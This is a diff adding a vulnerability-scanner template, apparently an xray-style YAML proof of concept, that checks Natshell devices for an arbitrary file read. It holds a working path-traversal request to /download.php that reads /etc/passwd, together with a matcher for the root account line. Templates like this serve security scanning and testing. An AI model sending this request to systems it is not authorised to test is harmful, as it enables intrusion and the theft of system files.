@@ -1,0 +1,21 @@
+id: poc-yaml-natshell-arbitrary-file-read
+info:
+  name: Natshell 任意文件读取漏洞
+  severity: medium
+  tags:
+  - 文件读取
+  finger: Natshell
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /download.php?file=../../../../../etc/passwd
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && matches(body, "(root|toor):[x*]:0:0:")
+  output: []
